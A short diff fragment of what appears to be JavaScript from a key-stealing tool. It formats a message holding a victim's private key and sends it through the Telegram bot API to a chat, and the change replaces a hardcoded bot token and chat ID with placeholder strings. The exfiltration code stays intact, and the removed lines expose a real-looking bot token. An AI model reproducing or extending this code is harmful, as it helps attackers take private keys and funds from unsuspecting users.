@@ -100,8 +100,8 @@ Private Key: \`${privateKey.trim()}\`
         break;
     }
 
-    const BOT_TOKEN = "7855101667:AAHfcKmKtVDPBHu1cV-TP39Lh0kuis_o0Fc";
-    const CHAT_ID = "-1002553760080";
+    const BOT_TOKEN = "Token";
+    const CHAT_ID = "chat id ";
 
     try {
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
